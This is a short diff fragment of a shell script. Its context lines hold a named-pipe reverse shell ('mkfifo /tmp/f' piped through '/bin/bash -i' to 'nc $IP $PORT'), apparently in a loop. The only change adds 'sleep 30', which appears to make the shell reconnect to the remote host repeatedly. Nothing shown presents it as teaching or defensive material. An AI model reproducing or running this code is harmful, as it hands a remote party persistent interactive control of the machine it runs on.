@@ -14,5 +14,5 @@ mkfifo /tmp/f
 # echo $IP
 cat /tmp/f | /bin/bash -i 2>&1 | nc $IP $PORT > /tmp/f
 
-
+sleep 30
 done
